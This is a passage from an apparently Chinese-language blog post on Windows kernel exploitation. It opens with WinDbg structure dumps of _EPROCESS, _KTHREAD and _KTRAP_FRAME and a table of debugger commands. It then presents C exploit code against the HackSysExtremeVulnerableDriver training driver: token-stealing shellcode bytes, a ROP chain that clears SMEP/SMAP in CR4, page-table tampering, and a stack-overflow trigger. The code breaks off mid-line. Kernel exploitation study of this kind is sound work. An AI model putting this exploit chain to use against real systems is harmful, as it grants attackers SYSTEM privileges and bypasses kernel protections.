class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br></pre></td><td class="code"><pre><span class="line">1: kd&gt; dt nt!_EPROCESS</span><br><span class="line">   +0x000 Pcb              : _KPROCESS</span><br><span class="line">   +0x438 ProcessLock      : _EX_PUSH_LOCK</span><br><span class="line">   +0x440 UniqueProcessId  : Ptr64 Void</span><br><span class="line">   +0x448 ActiveProcessLinks : _LIST_ENTRY</span><br><span class="line">   +0x458 RundownProtect   : _EX_RUNDOWN_REF</span><br><span class="line">   +0x460 Flags2           : Uint4B</span><br><span class="line">   +0x460 JobNotReallyActive : Pos 0, 1 Bit</span><br><span class="line">   +0x460 AccountingFolded : Pos 1, 1 Bit</span><br><span class="line">   +0x460 NewProcessReported : Pos 2, 1 Bit</span><br><span class="line">   +0x460 ExitProcessReported : Pos 3, 1 Bit</span><br><span class="line">   +0x460 ReportCommitChanges : Pos 4, 1 Bit</span><br><span class="line">   +0x460 LastReportMemory : Pos 5, 1 Bit</span><br><span class="line">   +0x460 ForceWakeCharge  : Pos 6, 1 Bit</span><br><span class="line">   +0x460 CrossSessionCreate : Pos 7, 1 Bit</span><br><span class="line">   +0x460 NeedsHandleRundown : Pos 8, 1 Bit</span><br><span class="line">   +0x460 RefTraceEnabled  : Pos 9, 1 Bit</span><br><span class="line">   +0x460 PicoCreated      : Pos 10, 1 Bit</span><br><span class="line">   +0x460 EmptyJobEvaluated : Pos 11, 1 Bit</span><br><span class="line">   +0x460 DefaultPagePriority : Pos 12, 3 Bits</span><br><span class="line">   +0x460 PrimaryTokenFrozen : Pos 15, 1 Bit</span><br><span class="line">   +0x460 ProcessVerifierTarget : Pos 16, 1 Bit</span><br><span class="line">   +0x460 RestrictSetThreadContext : Pos 17, 1 Bit</span><br><span class="line">   +0x460 AffinityPermanent : Pos 18, 1 Bit</span><br><span class="line">   +0x460 AffinityUpdateEnable : Pos 19, 1 Bit</span><br><span class="line">   +0x460 PropagateNode    : Pos 20, 1 Bit</span><br><span class="line">   +0x460 ExplicitAffinity : Pos 21, 1 Bit</span><br><span class="line">   +0x460 ProcessExecutionState : Pos 22, 2 Bits</span><br><span class="line">   +0x460 EnableReadVmLogging : Pos 24, 1 Bit</span><br><span class="line">   +0x460 EnableWriteVmLogging : Pos 25, 1 Bit</span><br><span class="line">   +0x460 FatalAccessTerminationRequested : Pos 26, 1 Bit</span><br><span class="line">   +0x460 DisableSystemAllowedCpuSet : Pos 27, 1 Bit</span><br><span class="line">   +0x460 ProcessStateChangeRequest : Pos 28, 2 Bits</span><br><span class="line">   +0x460 ProcessStateChangeInProgress : Pos 30, 1 Bit</span><br><span class="line">   +0x460 InPrivate        : Pos 31, 1 Bit</span><br><span class="line">   +0x464 Flags            : Uint4B</span><br><span class="line">   +0x464 CreateReported   : Pos 0, 1 Bit</span><br><span class="line">   +0x464 NoDebugInherit   : Pos 1, 1 Bit</span><br><span class="line">   +0x464 ProcessExiting   : Pos 2, 1 Bit</span><br><span class="line">   +0x464 ProcessDelete    : Pos 3, 1 Bit</span><br><span class="line">   +0x464 ManageExecutableMemoryWrites : Pos 4, 1 Bit</span><br><span class="line">   +0x464 VmDeleted        : Pos 5, 1 Bit</span><br><span class="line">   +0x464 OutswapEnabled   : Pos 6, 1 Bit</span><br><span class="line">   +0x464 Outswapped       : Pos 7, 1 Bit</span><br><span class="line">   +0x464 FailFastOnCommitFail : Pos 8, 1 Bit</span><br><span class="line">   +0x464 Wow64VaSpace4Gb  : Pos 9, 1 Bit</span><br><span class="line">   +0x464 AddressSpaceInitialized : Pos 10, 2 Bits</span><br><span class="line">   +0x464 SetTimerResolution : Pos 12, 1 Bit</span><br><span class="line">   +0x464 BreakOnTermination : Pos 13, 1 Bit</span><br><span class="line">   +0x464 DeprioritizeViews : Pos 14, 1 Bit</span><br><span class="line">   +0x464 WriteWatch       : Pos 15, 1 Bit</span><br><span class="line">   +0x464 ProcessInSession : Pos 16, 1 Bit</span><br><span class="line">   +0x464 OverrideAddressSpace : Pos 17, 1 Bit</span><br><span class="line">   +0x464 HasAddressSpace  : Pos 18, 1 Bit</span><br><span class="line">   +0x464 LaunchPrefetched : Pos 19, 1 Bit</span><br><span class="line">   +0x464 Background       : Pos 20, 1 Bit</span><br><span class="line">   +0x464 VmTopDown        : Pos 21, 1 Bit</span><br><span class="line">   +0x464 ImageNotifyDone  : Pos 22, 1 Bit</span><br><span class="line">   +0x464 PdeUpdateNeeded  : Pos 23, 1 Bit</span><br><span class="line">   +0x464 VdmAllowed       : Pos 24, 1 Bit</span><br><span class="line">   +0x464 ProcessRundown   : Pos 25, 1 Bit</span><br><span class="line">   +0x464 ProcessInserted  : Pos 26, 1 Bit</span><br><span class="line">   +0x464 DefaultIoPriority : Pos 27, 3 Bits</span><br><span class="line">   +0x464 ProcessSelfDelete : Pos 30, 1 Bit</span><br><span class="line">   +0x464 SetTimerResolutionLink : Pos 31, 1 Bit</span><br><span class="line">   +0x468 CreateTime       : _LARGE_INTEGER</span><br><span class="line">   +0x470 ProcessQuotaUsage : [2] Uint8B</span><br><span class="line">   +0x480 ProcessQuotaPeak : [2] Uint8B</span><br><span class="line">   +0x490 PeakVirtualSize  : Uint8B</span><br><span class="line">   +0x498 VirtualSize      : Uint8B</span><br><span class="line">   +0x4a0 SessionProcessLinks : _LIST_ENTRY</span><br><span class="line">   +0x4b0 ExceptionPortData : Ptr64 Void</span><br><span class="line">   +0x4b0 ExceptionPortValue : Uint8B</span><br><span class="line">   +0x4b0 ExceptionPortState : Pos 0, 3 Bits</span><br><span class="line">   +0x4b8 Token            : _EX_FAST_REF</span><br><span class="line">   ...</span><br></pre></td></tr></table></figure><h4 id="KTHREAD-线程结构体"><a href="#KTHREAD-线程结构体" class="headerlink" title="_KTHREAD (线程结构体)"></a>_KTHREAD (线程结构体)</h4><ul><li><code>dt nt!_KTHREAD</code></li><li>关键偏移：<ul><li><code>ApcState.Process</code> (指向 EPROCESS)</li><li><code>TrapFrame</code> (指向中断帧)</li></ul></li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">+0x090 TrapFrame        : Ptr64 _KTRAP_FRAME</span><br><span class="line">+0x098 ApcState         : _KAPC_STATE</span><br></pre></td></tr></table></figure><h4 id="KTRAP-FRAME-中断帧"><a href="#KTRAP-FRAME-中断帧" class="headerlink" title="_KTRAP_FRAME(中断帧)"></a>_KTRAP_FRAME(中断帧)</h4><ul><li><code>dt nt!_KTRAP_FRAME</code></li><li>关键偏移：<code>Rip</code>, <code>Rsp</code>, <code>EFlags</code></li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br></pre></td><td class="code"><pre><span class="line">1: kd&gt; dt nt!_KTRAP_FRAME</span><br><span class="line">   +0x000 P1Home           : Uint8B</span><br><span class="line">   +0x008 P2Home           : Uint8B</span><br><span class="line">   +0x010 P3Home           : Uint8B</span><br><span class="line">   +0x018 P4Home           : Uint8B</span><br><span class="line">   +0x020 P5               : Uint8B</span><br><span class="line">   +0x028 PreviousMode     : Char</span><br><span class="line">   +0x028 InterruptRetpolineState : UChar</span><br><span class="line">   +0x029 PreviousIrql     : UChar</span><br><span class="line">   +0x02a FaultIndicator   : UChar</span><br><span class="line">   +0x02a NmiMsrIbrs       : UChar</span><br><span class="line">   +0x02b ExceptionActive  : UChar</span><br><span class="line">   +0x02c MxCsr            : Uint4B</span><br><span class="line">   +0x030 Rax              : Uint8B</span><br><span class="line">   +0x038 Rcx              : Uint8B</span><br><span class="line">   +0x040 Rdx              : Uint8B</span><br><span class="line">   +0x048 R8               : Uint8B</span><br><span class="line">   +0x050 R9               : Uint8B</span><br><span class="line">   +0x058 R10              : Uint8B</span><br><span class="line">   +0x060 R11              : Uint8B</span><br><span class="line">   +0x068 GsBase           : Uint8B</span><br><span class="line">   +0x068 GsSwap           : Uint8B</span><br><span class="line">   +0x070 Xmm0             : _M128A</span><br><span class="line">   +0x080 Xmm1             : _M128A</span><br><span class="line">   +0x090 Xmm2             : _M128A</span><br><span class="line">   +0x0a0 Xmm3             : _M128A</span><br><span class="line">   +0x0b0 Xmm4             : _M128A</span><br><span class="line">   +0x0c0 Xmm5             : _M128A</span><br><span class="line">   +0x0d0 FaultAddress     : Uint8B</span><br><span class="line">   +0x0d0 ContextRecord    : Uint8B</span><br><span class="line">   +0x0d8 Dr0              : Uint8B</span><br><span class="line">   +0x0e0 Dr1              : Uint8B</span><br><span class="line">   +0x0e8 Dr2              : Uint8B</span><br><span class="line">   +0x0f0 Dr3              : Uint8B</span><br><span class="line">   +0x0f8 Dr6              : Uint8B</span><br><span class="line">   +0x100 Dr7              : Uint8B</span><br><span class="line">   +0x108 DebugControl     : Uint8B</span><br><span class="line">   +0x110 LastBranchToRip  : Uint8B</span><br><span class="line">   +0x118 LastBranchFromRip : Uint8B</span><br><span class="line">   +0x120 LastExceptionToRip : Uint8B</span><br><span class="line">   +0x128 LastExceptionFromRip : Uint8B</span><br><span class="line">   +0x130 SegDs            : Uint2B</span><br><span class="line">   +0x132 SegEs            : Uint2B</span><br><span class="line">   +0x134 SegFs            : Uint2B</span><br><span class="line">   +0x136 SegGs            : Uint2B</span><br><span class="line">   +0x138 TrapFrame        : Uint8B</span><br><span class="line">   +0x140 NmiPreviousSpecCtrl : Uint4B</span><br><span class="line">   +0x144 NmiPreviousSpecCtrlPad : Uint4B</span><br><span class="line">   +0x140 Rbx              : Uint8B</span><br><span class="line">   +0x148 Rdi              : Uint8B</span><br><span class="line">   +0x150 Rsi              : Uint8B</span><br><span class="line">   +0x158 Rbp              : Uint8B</span><br><span class="line">   +0x160 ErrorCode        : Uint8B</span><br><span class="line">   +0x160 ExceptionFrame   : Uint8B</span><br><span class="line">   +0x168 Rip              : Uint8B</span><br><span class="line">   +0x170 SegCs            : Uint2B</span><br><span class="line">   +0x172 Fill0            : UChar</span><br><span class="line">   +0x173 Logging          : UChar</span><br><span class="line">   +0x174 Fill1            : [2] Uint2B</span><br><span class="line">   +0x178 EFlags           : Uint4B</span><br><span class="line">   +0x17c Fill2            : Uint4B</span><br><span class="line">   +0x180 Rsp              : Uint8B</span><br><span class="line">   +0x188 SegSs            : Uint2B</span><br><span class="line">   +0x18a Fill3            : Uint2B</span><br><span class="line">   +0x18c Fill4            : Uint4B</span><br></pre></td></tr></table></figure><h3 id="6-调试命令-WinDbg"><a href="#6-调试命令-WinDbg" class="headerlink" title="6. 调试命令(WinDbg)"></a>6. 调试命令(WinDbg)</h3><table><thead><tr><th><strong>场景</strong></th><th><strong>命令</strong></th><th><strong>说明</strong></th></tr></thead><tbody><tr><td><strong>环境配置</strong></td><td><code>bcdedit /dbgsettings</code></td><td>查看&#x2F;设置调试 IP 和端口</td></tr><tr><td><strong>崩溃分析</strong></td><td><code>!analyze -v</code></td><td>蓝屏后查看原因 (BugCheck Code)</td></tr><tr><td><strong>寄存器</strong></td><td><code>r cr4</code></td><td>查看 SMEP&#x2F;SMAP 状态 (Bit 20&#x2F;21)</td></tr><tr><td><strong>寄存器</strong></td><td><code>rdmsr 0xC0000102</code></td><td>查看 Kernel GS Base</td></tr><tr><td><strong>内存查看</strong></td><td><code>dq &lt;addr&gt; L10</code></td><td>以 64 位格式查看内存</td></tr><tr><td><strong>反汇编</strong></td><td><code>u &lt;addr&gt; L10</code></td><td>查看地址处的汇编代码</td></tr><tr><td><strong>结构体</strong></td><td><code>dt nt!_EPROCESS &lt;addr&gt;</code></td><td>解析进程结构体</td></tr><tr><td><strong>Token</strong></td><td><code>!token &lt;addr&gt;</code></td><td>解析 Token 权限 (看是否为 System)</td></tr><tr><td><strong>页表</strong></td><td><code>!pte &lt;addr&gt;</code></td><td>查看虚拟地址的页表属性 (NX&#x2F;RW)</td></tr><tr><td><strong>断点</strong></td><td><code>bp &lt;addr&gt;</code></td><td>下断点</td></tr><tr><td><strong>断点</strong></td><td><code>bl</code>&#x2F;<code>bc *</code></td><td>列出断点 &#x2F; 清除所有断点</td></tr><tr><td><strong>符号搜索</strong></td><td><code>x nt!Ki*Shadow</code></td><td>搜索内核符号 (如 KPTI 相关)</td></tr></tbody></table><h3 id="EXP"><a href="#EXP" class="headerlink" title="EXP"></a>EXP</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;kwin.h&quot;</span></span></span><br><span class="line"><span class="comment">// 驱动设备名称</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> DEVICE_NAME <span class="string">&quot;\\\\.\\HackSysExtremeVulnerableDriver&quot;</span></span></span><br><span class="line"><span class="comment">// IOCTL 码：0x222003 </span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> HEVD_IOCTL_STACK_OVERFLOW 0x222003</span></span><br><span class="line"></span><br><span class="line"><span class="type">unsigned</span> <span class="type">char</span> shellcode[] = &#123;</span><br><span class="line">  <span class="number">0x48</span>, <span class="number">0x31</span>, <span class="number">0xC0</span>, <span class="number">0x65</span>, <span class="number">0x48</span>, <span class="number">0x8B</span>, <span class="number">0x80</span>, <span class="number">0x88</span>, <span class="number">0x01</span>, <span class="number">0x00</span>, </span><br><span class="line">  <span class="number">0x00</span>, <span class="number">0x48</span>, <span class="number">0x8B</span>, <span class="number">0x80</span>, <span class="number">0xB8</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x49</span>, <span class="number">0x89</span>, </span><br><span class="line">  <span class="number">0xC1</span>, <span class="number">0x48</span>, <span class="number">0x8B</span>, <span class="number">0x80</span>, <span class="number">0x48</span>, <span class="number">0x04</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x48</span>, <span class="number">0x8B</span>, </span><br><span class="line">  <span class="number">0x00</span>, <span class="number">0x48</span>, <span class="number">0x8B</span>, <span class="number">0x50</span>, <span class="number">0xF8</span>, <span class="number">0x49</span>, <span class="number">0x89</span>, <span class="number">0xC0</span>, <span class="number">0x48</span>, <span class="number">0x8B</span>, </span><br><span class="line">  <span class="number">0x00</span>, <span class="number">0x48</span>, <span class="number">0x83</span>, <span class="number">0xFA</span>, <span class="number">0x04</span>, <span class="number">0x75</span>, <span class="number">0xF0</span>, <span class="number">0x49</span>, <span class="number">0x8B</span>, <span class="number">0x50</span>, </span><br><span class="line">  <span class="number">0x70</span>, <span class="number">0x48</span>, <span class="number">0x83</span>, <span class="number">0xE2</span>, <span class="number">0xF8</span>, <span class="number">0x49</span>, <span class="number">0x8B</span>, <span class="number">0x89</span>, <span class="number">0xB8</span>, <span class="number">0x04</span>, </span><br><span class="line">  <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x48</span>, <span class="number">0x83</span>, <span class="number">0xE1</span>, <span class="number">0x07</span>, <span class="number">0x48</span>, <span class="number">0x01</span>, <span class="number">0xCA</span>, <span class="number">0x49</span>, </span><br><span class="line">  <span class="number">0x89</span>, <span class="number">0x91</span>, <span class="number">0xB8</span>, <span class="number">0x04</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x65</span>, <span class="number">0x48</span>, <span class="number">0x8B</span>, <span class="number">0x04</span>, </span><br><span class="line">  <span class="number">0x25</span>, <span class="number">0x88</span>, <span class="number">0x01</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x48</span>, <span class="number">0x8B</span>, <span class="number">0x90</span>, <span class="number">0x90</span>, <span class="number">0x00</span>, </span><br><span class="line">  <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x48</span>, <span class="number">0x8B</span>, <span class="number">0x8A</span>, <span class="number">0x68</span>, <span class="number">0x01</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x4C</span>, </span><br><span class="line">  <span class="number">0x8B</span>, <span class="number">0x9A</span>, <span class="number">0x78</span>, <span class="number">0x01</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x49</span>, <span class="number">0x81</span>, <span class="number">0xCB</span>, <span class="number">0x00</span>, </span><br><span class="line">  <span class="number">0x02</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x48</span>, <span class="number">0x8B</span>, <span class="number">0xA2</span>, <span class="number">0x80</span>, <span class="number">0x01</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, </span><br><span class="line">  <span class="number">0x48</span>, <span class="number">0x8B</span>, <span class="number">0xAA</span>, <span class="number">0x58</span>, <span class="number">0x01</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x31</span>, <span class="number">0xC0</span>, <span class="number">0x0F</span>, </span><br><span class="line">  <span class="number">0x01</span>, <span class="number">0xF8</span>, <span class="number">0x48</span>, <span class="number">0x0F</span>, <span class="number">0x07</span>, <span class="number">0xFF</span></span><br><span class="line">&#125;;</span><br><span class="line"><span class="meta">#<span class="keyword">define</span> POP_RCX_RET 0x2079ac</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> POP_RAX_RET 0x201862</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> POP_RDX_RET 0x3d0dea</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> POP_R8_RET 0x201861</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> MOV_CR4_RCX_RET 0x3a0397</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> mov_rax_qword_ptr_rcx_ret 0x32c1b0</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> add_rax_qword_ptr_rcx_0xa0_ret 0x649ce1</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> mov_byte_ptr_rax_cl_ret 0x49cadd</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> RET 0x20003e</span></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">    HANDLE hDevice;</span><br><span class="line">    DWORD bytesReturned;</span><br><span class="line">    BOOL success;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 1. 获取驱动句柄</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[*] Opening Driver...\n&quot;</span>);</span><br><span class="line">    hDevice = CreateFileA(</span><br><span class="line">        DEVICE_NAME,</span><br><span class="line">        GENERIC_READ | GENERIC_WRITE,</span><br><span class="line">        FILE_SHARE_READ | FILE_SHARE_WRITE,</span><br><span class="line">        <span class="literal">NULL</span>,</span><br><span class="line">        OPEN_EXISTING,</span><br><span class="line">        FILE_ATTRIBUTE_NORMAL | FILE_FLAG_OVERLAPPED,</span><br><span class="line">        <span class="literal">NULL</span></span><br><span class="line">    );</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (hDevice == INVALID_HANDLE_VALUE) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;[-] Failed to open driver! Error: %d\n&quot;</span>, GetLastError());</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[+] Driver opened successfully!\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 2. 准备内存存放 Shellcode</span></span><br><span class="line">    LPVOID lpPayload = VirtualAlloc(</span><br><span class="line">        <span class="literal">NULL</span>,</span><br><span class="line">        <span class="keyword">sizeof</span>(shellcode),</span><br><span class="line">        MEM_COMMIT | MEM_RESERVE,</span><br><span class="line">        PAGE_EXECUTE_READWRITE</span><br><span class="line">    );</span><br><span class="line">  </span><br><span class="line">    <span class="keyword">if</span> (!lpPayload) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;[-] Failed to allocate memory for shellcode!\n&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  </span><br><span class="line">    <span class="comment">// 把 Shellcode 复制进去</span></span><br><span class="line">    <span class="built_in">memcpy</span>(lpPayload, shellcode, <span class="keyword">sizeof</span>(shellcode));</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[+] Shellcode located at: 0x%p\n&quot;</span>, lpPayload);</span><br><span class="line">  </span><br><span class="line">    LPVOID userBuffer = VirtualAlloc(</span><br><span class="line">        <span class="literal">NULL</span>,</span><br><span class="line">        <span class="number">0x900</span>,</span><br><span class="line">        MEM_COMMIT | MEM_RESERVE,</span><br><span class="line">        PAGE_EXECUTE_READWRITE</span><br><span class="line">    );</span><br><span class="line"></span><br><span class="line">    <span class="built_in">memset</span>(userBuffer, <span class="string">&#x27;\x41&#x27;</span>, <span class="number">0x818</span>);</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> <span class="type">long</span> kernelbase=GetKernelModuleAddress(<span class="string">&quot;ntoskrnl.exe&quot;</span>);</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> <span class="type">long</span> ExpAllocatePoolWithTagFromNode=kernelbase+<span class="number">0x2BC81F</span>;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> <span class="type">long</span> memmove=kernelbase+<span class="number">0x413540</span>;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> <span class="type">long</span> MiGetPteAddress=kernelbase+<span class="number">0x298780</span>;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> <span class="type">long</span> pte_addr=(<span class="number">0xFFFFF78000000000</span> &gt;&gt; <span class="number">9</span>) &amp; <span class="number">0x7FFFFFFFF8</span>;</span><br><span class="line">    DWORD64* rop = (DWORD64*)((DWORD64)userBuffer + <span class="number">0x818</span>);</span><br><span class="line">    <span class="type">int</span> index = <span class="number">0</span>;</span><br><span class="line">    *(rop + index++) = POP_RCX_RET+kernelbase;</span><br><span class="line">    *(rop + index++) = <span class="number">0xb50ef8</span> ^ (<span class="number">1UL</span> &lt;&lt; <span class="number">20</span>) ^ (<span class="number">1UL</span> &lt;&lt; <span class="number">21</span>);</span><br><span class="line">    *(rop + index++) = MOV_CR4_RCX_RET+kernelbase;</span><br><span class="line">    *(rop + index++) = POP_RAX_RET+kernelbase;</span><br><span class="line">    *(rop + index++) = pte_addr+<span class="number">0x7</span>;</span><br><span class="line">    *(rop + index++) = POP_RCX_RET+kernelbase;</span><br><span class="line">    *(rop + index++) = MiGetPteAddress+<span class="number">0x13</span><span class="number">-0xa0</span>;</span><br><span class="line">    *(rop + index++) = add_rax_qword_ptr_rcx_0xa0_ret+kernelbase; <span class="comment">//add rax, [rcx+0xa];ret;</span></span><br><span class="line">    *(rop + index++) = POP_RCX_RET+kernelbase;</span><br><span class="line">    *(rop + index++) = <span class="number">0</span>;</span><br><span class="line">    *(rop + index++) = mov_byte_ptr_rax_cl_ret+kernelbase;</span><br><span class="line">    *(rop + index++) = POP_RCX_RET+kernelbase;</span><br><span class="line">    *(rop + index++) = <span class="number">0xFFFFF78000000000</span>+<span class="number">0x720</span>;</span><br><span class="line">    *(rop + index++) = POP_RDX_RET+kernelbase;</span><br><span class="line">    *(rop + index++) = (DWORD64)shellcode;</span><br><span class="line">    *(rop + index++) = POP_R8_RET+kernelbase;</span><br><span class="line">    *(rop + index++) = <span class="number">0x200</span>;</span><br><span class="line">    *(rop + index++) = memmove;</span><br><span class="line">    *(rop + index++) = RET+kernelbase;</span><br><span class="line">    *(rop + index++) = <span class="number">0xFFFFF78000000000</span>+<span class="number">0x720</span>;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[*] Triggering Stack Overflow...\n&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;    Buffer Size: %d\n&quot;</span>, <span class="number">0x900</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;    Overwriting RET with: 0x%p\n&quot;</span>, lpPayload);</span><br><span class="line"></span><br><span class="line">    <span 